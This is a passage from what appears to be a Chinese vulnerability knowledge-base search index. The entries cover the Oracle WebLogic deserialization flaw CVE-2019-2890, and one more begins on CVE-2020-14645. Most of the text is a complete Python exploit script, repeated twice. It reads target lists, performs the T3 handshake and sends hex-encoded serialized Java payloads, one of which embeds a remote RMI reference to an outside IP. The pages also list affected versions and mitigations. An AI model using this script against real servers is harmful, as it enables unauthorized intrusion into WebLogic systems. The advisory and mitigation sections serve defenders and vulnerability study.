server_addr [ 1 ], VUL [ index ]) vul_yes . append ( server_addr ) else : print ' %s : %d \u4e0d\u5b58\u5728 %s \u6f0f\u6d1e\u3002' % ( server_addr [ 0 ], server_addr [ 1 ], VUL [ index ]) print '[+] You look like Cai Xukun when you play basketball' vul_no . append ( server_addr ) def run ( index ): with open ( \"url.txt\" , 'r' ) as lists : for server_addr in lists : server_addr = server_addr . strip ( ' \\n\\r ' ) dip = server_addr . split ( ':' )[ 0 ] global dport dport = int ( server_addr . split ( ':' )[ 1 ]) sock = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) sock . settimeout ( 15 ) server_addr = ( dip , dport ) try : t3handshake ( sock , server_addr ) except Exception as e : print ' %s : %d \u8fde\u63a5\u5931\u8d25\uff0c\u8bf7\u68c0\u67e5IP\u662f\u5426\u5b58\u6d3b...' % ( server_addr [ 0 ], server_addr [ 1 ]) else : try : lendate = buildT3RequestObject ( sock , dport , server_addr ) rs = sendEvilObjData ( sock , PAYLOAD [ index ], lendate ) # print 'rs',rs except Exception as e : print ' %s : %d \u8bf7\u6c42\u9891\u7e41\uff0c\u8bf7\u7a0d\u540e\u81ea\u884c\u5355\u72ec\u6d4b\u8bd5...' % ( server_addr [ 0 ], server_addr [ 1 ]) vul_more_test . append ( server_addr ) else : checkVul ( rs , server_addr , index ) finally : sock . close () print '=' * 50 print '\u68c0\u6d4b\u5b8c\u6210\uff01' print '\u4ee5\u4e0bIP\u5b58\u5728CVE-2019-2890\u6f0f\u6d1e\uff1a' for yes in vul_yes : print ' %s : %s ' % ( yes [ 0 ], yes [ 1 ]) print '=' * 50 print '\u4ee5\u4e0bIP\u4e0d\u5b58\u5728\u6f0f\u6d1e\uff1a' for no in vul_no : print ' %s : %s ' % ( no [ 0 ], no [ 1 ]) print '=' * 50 print '\u4ee5\u4e0bIP\u8bf7\u6c42\u9891\u7e41\uff0c\u9700\u5355\u72ec\u81ea\u884c\u6d4b\u8bd5\uff1a' for more in vul_more_test : print ' %s : %s ' % ( more [ 0 ], more [ 1 ]) print '=' * 50 if __name__ == \"__main__\" : run ( 0 ) \u6f0f\u6d1e\u5371\u5bb3 \u00b6 \u4e25\u91cd \u5f71\u54cd\u7248\u672c \u00b6 WebLogic Server 10.3.6.0 WebLogic Server 12.1.3.0 WebLogic Server 12.2.1.3 \u5b89\u5168\u5efa\u8bae \u00b6 \u4e00\u3001\u7981\u7528 T3 \u534f\u8bae \u5982\u679c\u60a8\u4e0d\u4f9d\u8d56 T3 \u534f\u8bae\u8fdb\u884c JVM \u901a\u4fe1\uff0c\u53ef\u901a\u8fc7\u6682\u65f6\u963b\u65ad T3 \u534f\u8bae\u7f13\u89e3\u6b64\u6f0f\u6d1e\u5e26\u6765\u7684\u5f71\u54cd\u3002 \u8fdb\u5165 Weblogic \u63a7\u5236\u53f0\uff0c\u5728 base_domain \u914d\u7f6e\u9875\u9762\u4e2d\uff0c\u8fdb\u5165\u201c\u5b89\u5168\u201d\u9009\u9879\u5361\u9875\u9762\uff0c\u70b9\u51fb\u201c\u7b5b\u9009\u5668\u201d\uff0c\u914d\u7f6e\u7b5b\u9009\u5668\u3002 \u5728\u8fde\u63a5\u7b5b\u9009\u5668\u4e2d\u8f93\u5165\uff1aweblogic.security.net.ConnectionFilterImpl\uff0c\u5728\u8fde\u63a5\u7b5b\u9009\u5668\u89c4\u5219\u6846\u4e2d\u8f93\u5165\uff1a* * 7001 deny t3 t3s\u3002 \u4fdd\u5b58\u751f\u6548\uff08\u65e0\u9700\u91cd\u542f\uff09\u3002 \u4e8c\u3001\u6392\u67e5\u5f31\u53e3\u4ee4 \u6392\u67e5 Weblogic \u7ba1\u7406\u540e\u53f0\u662f\u5426\u5b58\u5728\u5f31\u53e3\u4ee4\uff0c\u589e\u5f3a\u5bc6\u7801\u5f3a\u5ea6\u3002 \u4e09\u3001\u5347\u7ea7\u8865\u4e01 \u76f8\u5173\u94fe\u63a5 https://www.oracle.com/technetwork/security-advisory/cpuoct2019-5072832.html","title":"CVE 2019 2890 Oracle WebLogic \u53cd\u5e8f\u5217\u5316\u4e25\u91cd\u6f0f\u6d1e"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/CVE-2019-2890-Oracle%20WebLogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9E/#cve-2019-2890-oracle-weblogic","text":"","title":"CVE-2019-2890-Oracle WebLogic \u53cd\u5e8f\u5217\u5316\u4e25\u91cd\u6f0f\u6d1e"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/CVE-2019-2890-Oracle%20WebLogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9E/#_1","text":"HSCERT\u76d1\u6d4b\u53d1\u73b0WebLogic\u5b98\u65b9\u53d1\u5e03\u4e86CVE-2019-2890\u6f0f\u6d1e\u9884\u8b66\u3002\u6b64\u6f0f\u6d1e\u5b58\u5728\u4e8eWeblogic Console\u7ec4\u4ef6\u4e2d\uff0c\u672a\u7ecf\u6388\u6743\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u53d1\u9001\u7cbe\u5fc3\u6784\u9020\u7684\u6076\u610f HTTP \u8bf7\u6c42\uff0c\u83b7\u53d6\u670d\u52a1\u5668\u6743\u9650\u3002 WebLogic \u662f Oracle \u516c\u53f8\u51fa\u54c1\u7684\u57fa\u4e8e JavaEE \u67b6\u6784\u7684\u4e2d\u95f4\u4ef6\uff0c\u7528\u4e8e\u5f00\u53d1\u3001\u96c6\u6210\u3001\u90e8\u7f72\u548c\u7ba1\u7406\u5927\u578b\u5206\u5e03\u5f0f Web \u5e94\u7528\u3001\u7f51\u7edc\u5e94\u7528\u548c\u6570\u636e\u5e93\u5e94\u7528\u3002","title":"\u6f0f\u6d1e\u80cc\u666f"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/CVE-2019-2890-Oracle%20WebLogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9E/#_2","text":"Weblogic\u5728\u5229\u7528T3\u534f\u8bae\u8fdb\u884c\u8fdc\u7a0b\u8d44\u6e90\u52a0\u8f7d\u8c03\u7528\u65f6\uff0c\u9ed8\u8ba4\u4f1a\u8fdb\u884c\u9ed1\u540d\u5355\u8fc7\u6ee4\u4ee5\u4fdd\u8bc1\u53cd\u5e8f\u5217\u5316\u5b89\u5168\u3002\u672c\u6f0f\u6d1e\u7ed5\u8fc7\u4e86Weblogic\u7684\u53cd\u5e8f\u5217\u5316\u9ed1\u540d\u5355\uff0c\u4f7f\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7T3\u534f\u8bae\u5bf9\u5b58\u5728\u6f0f\u6d1e\u7684Weblogic\u7ec4\u4ef6\u5b9e\u65bd\u8fdc\u7a0b\u653b\u51fb\u3002 \u7531\u4e8eT3\u534f\u8bae\u5728Weblogic\u63a7\u5236\u53f0\u5f00\u542f\u7684\u60c5\u51b5\u4e0b\u9ed8\u8ba4\u5f00\u542f\uff0c\u800cWeblogic\u9ed8\u8ba4\u5b89\u88c5\u4f1a\u81ea\u52a8\u5f00\u542f\u63a7\u5236\u53f0\uff0c\u6240\u4ee5\u653b\u51fb\u8005\u53ef\u901a\u8fc7\u6b64\u6f0f\u6d1e\u9020\u6210\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff0c\u4ee5\u63a7\u5236Weblogic\u670d\u52a1\u5668\u3002 \u6f0f\u6d1ePoC\u5982\u4e0b\uff1a #!/usr/bin/python # -*- coding: utf-8 -*- # 2019-10-17 8:45 import socket import time import re import sys timeout = int ( sys . argv [ 1 ]) VUL = [ 'CVE-2019-2890' ] PAYLOAD = [ 'aced0005737d00000001001d6a6176612e726d692e61637469766174696f6e2e416374697661746f72787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707737000a556e6963617374526566000e3130342e3235312e3232382e353000001b590000000001eea90b00000000000000000000000000000078' ] VER_SIG = [ ' \\\\ $Proxy[0-9]+' ] vul_no = [] vul_yes = [] vul_more_test = [] def t3handshake ( sock , server_addr ): print '\u6b63\u5728\u8fde\u63a5\u670d\u52a1\u5668...' sock . connect ( server_addr ) sock . send ( '74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a' . decode ( 'hex' )) time . sleep ( 1 ) sock . recv ( 1024 ) def buildT3RequestObject ( sock , port , server_addr ): print ' %s : %d \u8fde\u63a5\u6210\u529f\uff0c\u6b63\u5728\u53d1\u9001\u8bf7\u6c42...' % ( server_addr [ 0 ], server_addr [ 1 ]) data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371' data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000 {0} ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07' . format ( ' {:04x} ' . format ( dport )) data3 = '1a7727000d3234322e323134' data4 = '2e312e32353461863d1d0000000078' for d in [ data1 , data2 , data3 , data4 ]: sock . send ( d . decode ( 'hex' )) time . sleep ( 2 ) lendate = len ( sock . recv ( 2048 )) print '\u53d1\u9001\u6709\u6548\u8f7d\u8377\u8bf7\u6c42\u6210\u529f,\u63a5\u6536\u957f\u5ea6: %d ' % ( lendate ) return lendate def sendEvilObjData ( sock , data , lendate ): print '\u6b63\u5728\u6267\u884c\u8f7d\u8377\uff0c\u8bf7\u7a0d\u7b49...' payload = '056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000' payload += data payload += 'fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff' payload = ' %s%s ' % ( ' {:08x} ' . format ( len ( payload ) / 2 + 4 ), payload ) sock . send ( payload . decode ( 'hex' )) time . sleep ( 2 ) sock . send ( payload . decode ( 'hex' )) res = '' start = time . time () try : while True : res += sock . recv ( 4096 ) time . sleep ( 0.1 ) end = time . time () timeend = end - start if lendate == 0 and timeend > timeout : break except Exception as e : pass return res def checkVul ( res , server_addr , index ): print '\u6267\u884c\u7ed3\u679c\uff1a' p = re . findall ( VER_SIG [ index ], res , re . S ) if len ( p ) > 0 : print ' %s : %d \u5b58\u5728 %s \u6f0f\u6d1e\u3002' % ( server_addr [ 0 ], server_addr [ 1 ], VUL [ index ]) vul_yes . append ( server_addr ) else : print ' %s : %d \u4e0d\u5b58\u5728 %s \u6f0f\u6d1e\u3002' % ( server_addr [ 0 ], server_addr [ 1 ], VUL [ index ]) print '[+] You look like Cai Xukun when you play basketball' vul_no . append ( server_addr ) def run ( index ): with open ( \"url.txt\" , 'r' ) as lists : for server_addr in lists : server_addr = server_addr . strip ( ' \\n\\r ' ) dip = server_addr . split ( ':' )[ 0 ] global dport dport = int ( server_addr . split ( ':' )[ 1 ]) sock = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) sock . settimeout ( 15 ) server_addr = ( dip , dport ) try : t3handshake ( sock , server_addr ) except Exception as e : print ' %s : %d \u8fde\u63a5\u5931\u8d25\uff0c\u8bf7\u68c0\u67e5IP\u662f\u5426\u5b58\u6d3b...' % ( server_addr [ 0 ], server_addr [ 1 ]) else : try : lendate = buildT3RequestObject ( sock , dport , server_addr ) rs = sendEvilObjData ( sock , PAYLOAD [ index ], lendate ) # print 'rs',rs except Exception as e : print ' %s : %d \u8bf7\u6c42\u9891\u7e41\uff0c\u8bf7\u7a0d\u540e\u81ea\u884c\u5355\u72ec\u6d4b\u8bd5...' % ( server_addr [ 0 ], server_addr [ 1 ]) vul_more_test . append ( server_addr ) else : checkVul ( rs , server_addr , index ) finally : sock . close () print '=' * 50 print '\u68c0\u6d4b\u5b8c\u6210\uff01' print '\u4ee5\u4e0bIP\u5b58\u5728CVE-2019-2890\u6f0f\u6d1e\uff1a' for yes in vul_yes : print ' %s : %s ' % ( yes [ 0 ], yes [ 1 ]) print '=' * 50 print '\u4ee5\u4e0bIP\u4e0d\u5b58\u5728\u6f0f\u6d1e\uff1a' for no in vul_no : print ' %s : %s ' % ( no [ 0 ], no [ 1 ]) print '=' * 50 print '\u4ee5\u4e0bIP\u8bf7\u6c42\u9891\u7e41\uff0c\u9700\u5355\u72ec\u81ea\u884c\u6d4b\u8bd5\uff1a' for more in vul_more_test : print ' %s : %s ' % ( more [ 0 ], more [ 1 ]) print '=' * 50 if __name__ == \"__main__\" : run ( 0 )","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/CVE-2019-2890-Oracle%20WebLogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9E/#_3","text":"\u4e25\u91cd","title":"\u6f0f\u6d1e\u5371\u5bb3"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/CVE-2019-2890-Oracle%20WebLogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9E/#_4","text":"WebLogic Server 10.3.6.0 WebLogic Server 12.1.3.0 WebLogic Server 12.2.1.3","title":"\u5f71\u54cd\u7248\u672c"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/CVE-2019-2890-Oracle%20WebLogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9E/#_5","text":"\u4e00\u3001\u7981\u7528 T3 \u534f\u8bae \u5982\u679c\u60a8\u4e0d\u4f9d\u8d56 T3 \u534f\u8bae\u8fdb\u884c JVM \u901a\u4fe1\uff0c\u53ef\u901a\u8fc7\u6682\u65f6\u963b\u65ad T3 \u534f\u8bae\u7f13\u89e3\u6b64\u6f0f\u6d1e\u5e26\u6765\u7684\u5f71\u54cd\u3002 \u8fdb\u5165 Weblogic \u63a7\u5236\u53f0\uff0c\u5728 base_domain \u914d\u7f6e\u9875\u9762\u4e2d\uff0c\u8fdb\u5165\u201c\u5b89\u5168\u201d\u9009\u9879\u5361\u9875\u9762\uff0c\u70b9\u51fb\u201c\u7b5b\u9009\u5668\u201d\uff0c\u914d\u7f6e\u7b5b\u9009\u5668\u3002 \u5728\u8fde\u63a5\u7b5b\u9009\u5668\u4e2d\u8f93\u5165\uff1aweblogic.security.net.ConnectionFilterImpl\uff0c\u5728\u8fde\u63a5\u7b5b\u9009\u5668\u89c4\u5219\u6846\u4e2d\u8f93\u5165\uff1a* * 7001 deny t3 t3s\u3002 \u4fdd\u5b58\u751f\u6548\uff08\u65e0\u9700\u91cd\u542f\uff09\u3002 \u4e8c\u3001\u6392\u67e5\u5f31\u53e3\u4ee4 \u6392\u67e5 Weblogic \u7ba1\u7406\u540e\u53f0\u662f\u5426\u5b58\u5728\u5f31\u53e3\u4ee4\uff0c\u589e\u5f3a\u5bc6\u7801\u5f3a\u5ea6\u3002 \u4e09\u3001\u5347\u7ea7\u8865\u4e01 \u76f8\u5173\u94fe\u63a5 https://www.oracle.com/technetwork/security-advisory/cpuoct2019-5072832.html","title":"\u5b89\u5168\u5efa\u8bae"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/Oracle%20WebLogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9ECVE-2019-2890/","text":"\u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Weblogic\u5728\u5229\u7528T3\u534f\u8bae\u8fdb\u884c\u8fdc\u7a0b\u8d44\u6e90\u52a0\u8f7d\u8c03\u7528\u65f6\uff0c\u9ed8\u8ba4\u4f1a\u8fdb\u884c\u9ed1\u540d\u5355\u8fc7\u6ee4\u4ee5\u4fdd\u8bc1\u53cd\u5e8f\u5217\u5316\u5b89\u5168\u3002\u672c\u6f0f\u6d1e\u7ed5\u8fc7\u4e86Weblogic\u7684\u53cd\u5e8f\u5217\u5316\u9ed1\u540d\u5355\uff0c\u4f7f\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7T3\u534f\u8bae\u5bf9\u5b58\u5728\u6f0f\u6d1e\u7684Weblogic\u7ec4\u4ef6\u5b9e\u65bd\u8fdc\u7a0b\u653b\u51fb\u3002 \u5f71\u54cd\u7248\u672c \u00b6 WebLogic Server 10.3.6.0 WebLogic Server 12.1.3.0 WebLogic Server 12.2.1.3 \u6f0f\u6d1e\u5371\u5bb3 \u00b6 \u4e25\u91cd \u6f0f\u6d1ePoC\u5982\u4e0b \u00b6 \u94fe\u63a5\uff1a https://pan.baidu.com/s/1V9Gq6V4yItIP5Et1wSfWsQ \u63d0\u53d6\u7801\uff1a8cx6 \u5b89\u5168\u5efa\u8bae \u00b6 \u4e00\u3001\u7981\u7528 T3 \u534f\u8bae \u5982\u679c\u60a8\u4e0d\u4f9d\u8d56 T3 \u534f\u8bae\u8fdb\u884c JVM \u901a\u4fe1\uff0c\u53ef\u901a\u8fc7\u6682\u65f6\u963b\u65ad T3 \u534f\u8bae\u7f13\u89e3\u6b64\u6f0f\u6d1e\u5e26\u6765\u7684\u5f71\u54cd\u3002 1. \u8fdb\u5165 Weblogic \u63a7\u5236\u53f0\uff0c\u5728 base_domain \u914d\u7f6e\u9875\u9762\u4e2d\uff0c\u8fdb\u5165\u201c\u5b89\u5168\u201d\u9009\u9879\u5361\u9875\u9762\uff0c\u70b9\u51fb\u201c\u7b5b\u9009\u5668\u201d\uff0c\u914d\u7f6e\u7b5b\u9009\u5668\u3002 2. \u5728\u8fde\u63a5\u7b5b\u9009\u5668\u4e2d\u8f93\u5165\uff1aweblogic.security.net.ConnectionFilterImpl\uff0c\u5728\u8fde\u63a5\u7b5b\u9009\u5668\u89c4\u5219\u6846\u4e2d\u8f93\u5165\uff1a* * 7001 deny t3 t3s\u3002 3. \u4fdd\u5b58\u751f\u6548\uff08\u65e0\u9700\u91cd\u542f\uff09\u3002 \u4e8c\u3001\u6392\u67e5\u5f31\u53e3\u4ee4 \u6392\u67e5 Weblogic \u7ba1\u7406\u540e\u53f0\u662f\u5426\u5b58\u5728\u5f31\u53e3\u4ee4\uff0c\u589e\u5f3a\u5bc6\u7801\u5f3a\u5ea6\u3002 \u4e09\u3001\u5347\u7ea7\u8865\u4e01 \u76f8\u5173\u94fe\u63a5 : https://www.oracle.com/technetwork/security-advisory/cpuoct2019-5072832.html","title":"Oracle WebLogic \u53cd\u5e8f\u5217\u5316\u4e25\u91cd\u6f0f\u6d1eCVE-2019-2890"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/Oracle%20WebLogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9ECVE-2019-2890/#_1","text":"Weblogic\u5728\u5229\u7528T3\u534f\u8bae\u8fdb\u884c\u8fdc\u7a0b\u8d44\u6e90\u52a0\u8f7d\u8c03\u7528\u65f6\uff0c\u9ed8\u8ba4\u4f1a\u8fdb\u884c\u9ed1\u540d\u5355\u8fc7\u6ee4\u4ee5\u4fdd\u8bc1\u53cd\u5e8f\u5217\u5316\u5b89\u5168\u3002\u672c\u6f0f\u6d1e\u7ed5\u8fc7\u4e86Weblogic\u7684\u53cd\u5e8f\u5217\u5316\u9ed1\u540d\u5355\uff0c\u4f7f\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7T3\u534f\u8bae\u5bf9\u5b58\u5728\u6f0f\u6d1e\u7684Weblogic\u7ec4\u4ef6\u5b9e\u65bd\u8fdc\u7a0b\u653b\u51fb\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/Oracle%20WebLogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9ECVE-2019-2890/#_2","text":"WebLogic Server 10.3.6.0 WebLogic Server 12.1.3.0 WebLogic Server 12.2.1.3","title":"\u5f71\u54cd\u7248\u672c"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/Oracle%20WebLogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9ECVE-2019-2890/#_3","text":"\u4e25\u91cd","title":"\u6f0f\u6d1e\u5371\u5bb3"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/Oracle%20WebLogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9ECVE-2019-2890/#poc","text":"\u94fe\u63a5\uff1a https://pan.baidu.com/s/1V9Gq6V4yItIP5Et1wSfWsQ \u63d0\u53d6\u7801\uff1a8cx6","title":"\u6f0f\u6d1ePoC\u5982\u4e0b"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/Oracle%20WebLogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9ECVE-2019-2890/#_4","text":"\u4e00\u3001\u7981\u7528 T3 \u534f\u8bae \u5982\u679c\u60a8\u4e0d\u4f9d\u8d56 T3 \u534f\u8bae\u8fdb\u884c JVM \u901a\u4fe1\uff0c\u53ef\u901a\u8fc7\u6682\u65f6\u963b\u65ad T3 \u534f\u8bae\u7f13\u89e3\u6b64\u6f0f\u6d1e\u5e26\u6765\u7684\u5f71\u54cd\u3002 1. \u8fdb\u5165 Weblogic \u63a7\u5236\u53f0\uff0c\u5728 base_domain \u914d\u7f6e\u9875\u9762\u4e2d\uff0c\u8fdb\u5165\u201c\u5b89\u5168\u201d\u9009\u9879\u5361\u9875\u9762\uff0c\u70b9\u51fb\u201c\u7b5b\u9009\u5668\u201d\uff0c\u914d\u7f6e\u7b5b\u9009\u5668\u3002 2. \u5728\u8fde\u63a5\u7b5b\u9009\u5668\u4e2d\u8f93\u5165\uff1aweblogic.security.net.ConnectionFilterImpl\uff0c\u5728\u8fde\u63a5\u7b5b\u9009\u5668\u89c4\u5219\u6846\u4e2d\u8f93\u5165\uff1a* * 7001 deny t3 t3s\u3002 3. \u4fdd\u5b58\u751f\u6548\uff08\u65e0\u9700\u91cd\u542f\uff09\u3002 \u4e8c\u3001\u6392\u67e5\u5f31\u53e3\u4ee4 \u6392\u67e5 Weblogic \u7ba1\u7406\u540e\u53f0\u662f\u5426\u5b58\u5728\u5f31\u53e3\u4ee4\uff0c\u589e\u5f3a\u5bc6\u7801\u5f3a\u5ea6\u3002 \u4e09\u3001\u5347\u7ea7\u8865\u4e01 \u76f8\u5173\u94fe\u63a5 : https://www.oracle.com/technetwork/security-advisory/cpuoct2019-5072832.html","title":"\u5b89\u5168\u5efa\u8bae"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/WebLogic%20UniversalExtractor%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%28CVE-2020-14645%29/","text":"WebLogic UniversalExtractor\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e(CVE-2020-14645) \u00b6 \u7b80\u4ecb WebLogic \u662f\u7f8e\u56fd Oracle \u516c\u53f8\u7684 Java \u5e94\u7528\u670d\u52a1\u5668\uff0c\u786e\u5207\u8bf4\u662f\u4e00\u4e2a\u4e2d\u95f4\u4ef6\uff0c\u88ab\u7528\u4e8eWEB\u5e94\u7528\u3001\u6570\u636e\u5e93\u5e94\u7528\u7b49\u7684\u96c6\u6210\u5f00\u53d1\u90e8\u7f72\u3002 WebLogic \u7684 T3 \u534f\u8bae\u6613\u88ab\u5229\u7528\uff0c\u4ece\u800c\u91c7\u7528 JNDI \u6ce8\u5165\u3001\u53cd\u5e8f\u5217\u5316\u65b9\u6cd5\u8fbe\u5230\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u7684\u76ee\u6807\u3002 \u5b58\u5728\u5b89\u5168\u7f3a\u9677\u7684\u7248\u672c\uff1aWebLogic12.2.1.4.x\uff0c\u3010JDK\u7248\u672c\uff1a6u211\u4ee5\u4e0b\uff1b7u201\u4ee5\u4e0b\uff1b8u191\u4ee5\u4e0b\u3011\u3002\u672c\u6587\u4f7f\u7528JDK1.8.0_181\u3002 1.3 \u6f0f\u6d1e\u6316\u6398\u80fd\u529b\u6761\u4ef6 